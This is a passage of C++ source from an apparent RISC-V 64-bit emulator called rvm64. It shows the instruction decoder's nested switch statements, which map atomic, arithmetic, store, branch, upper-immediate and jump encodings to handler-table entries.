                    case 0b01100: return rvm64::operation::__handler[tblenum::_amoand_w];
                    case 0b01000: return rvm64::operation::__handler[tblenum::_amoor_w];
                    case 0b10000: return rvm64::operation::__handler[tblenum::_amomin_w];
                    case 0b10100: return rvm64::operation::__handler[tblenum::_amomax_w];
                    case 0b11000: return rvm64::operation::__handler[tblenum::_amominu_w];
                    case 0b11100: return rvm64::operation::__handler[tblenum::_amomaxu_w];
                }
                case 0b011: switch(func5) {
                    case 0b00010: return rvm64::operation::__handler[tblenum::_lrd];
                    case 0b00011: return rvm64::operation::__handler[tblenum::_scd];
                    case 0b00001: return rvm64::operation::__handler[tblenum::_amoswap_d];
                    case 0b00000: return rvm64::operation::__handler[tblenum::_amoadd_d];
                    case 0b00100: return rvm64::operation::__handler[tblenum::_amoxor_d];
                    case 0b01100: return rvm64::operation::__handler[tblenum::_amoand_d];
                    case 0b01000: return rvm64::operation::__handler[tblenum::_amoor_d];
                    case 0b10000: return rvm64::operation::__handler[tblenum::_amomin_d];
                    case 0b10100: return rvm64::operation::__handler[tblenum::_amomax_d];
                    case 0b11000: return rvm64::operation::__handler[tblenum::_amominu_d];
                    case 0b11100: return rvm64::operation::__handler[tblenum::_amomaxu_d];
                }
            }
            case 0b0111011: switch(func3) {
                case 0b000: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_addw]; 
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_subw];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_mulw];
                }
                case 0b101: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_srlw];
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_sraw];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_divuw];
                }
                case 0b001: return rvm64::operation::__handler[tblenum::_sllw];
                case 0b100: return rvm64::operation::__handler[tblenum::_divw];
                case 0b110: return rvm64::operation::__handler[tblenum::_remw];
                case 0b111: return rvm64::operation::__handler[tblenum::_remuw];
            }
            case 0b0110011: switch(func3) {
                case 0b000: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_add];
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_sub];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_mul];
                }
                case 0b001: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_sll];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_mulh];
                }
                case 0b010: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_slt];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_mulhsu];
                }
                case 0b011: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_sltu];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_mulhu];
                }
                case 0b100: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_xor];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_div];
                }
                case 0b101: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_srl];
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_sra];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_divu];
                }
                case 0b110: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_or];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_rem];
                }
                case 0b111: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_and];
                    case 0b0000001: return rvm64::operation::__handler[tblenum::_remu];
                }
            }
        } 
        // S TYPE
        case typenum::stype: switch(opcode) {
            case 0b0100011: switch(func3) {
                case 0b000: return rvm64::operation::__handler[tblenum::_sb];
                case 0b001: return rvm64::operation::__handler[tblenum::_sh]; 
                case 0b010: return rvm64::operation::__handler[tblenum::_sw];
                case 0b011: return rvm64::operation::__handler[tblenum::_sd];
            }
            case 0b0100111: switch(func3) {
                case 0b010: return rvm64::operation::__handler[tblenum::_fsw];
                case 0b011: return rvm64::operation::__handler[tblenum::_fsd];
                case 0b100: return rvm64::operation::__handler[tblenum::_fsq];
            }
        }
        // B TYPE
        case typenum::btype: switch(func3) {
            case 0b000: return rvm64::operation::__handler[tblenum::_beq];
            case 0b001: return rvm64::operation::__handler[tblenum::_bne];
            case 0b100: return rvm64::operation::__handler[tblenum::_blt];
            case 0b101: return rvm64::operation::__handler[tblenum::_bge];
            case 0b110: return rvm64::operation::__handler[tblenum::_bltu];
            case 0b111: return rvm64::operation::__handler[tblenum::_bgeu];
        }
        // U TYPE
        case typenum::utype: switch(opcode) {
            case 0b0110111: return rvm64::operation::__handler[tblenum::_lui];
            case 0b0010111: return rvm64::operation::__handler[tblenum::_auipc];
        }
        // J TYPE
        case typenum::jtype: switch(opcode) { 
            case 0b1101111: return rvm64::operation::__handler[tblenum::_jal];
        }
        // R4 TYPE
        case typenum::r4type: {}
    }
}

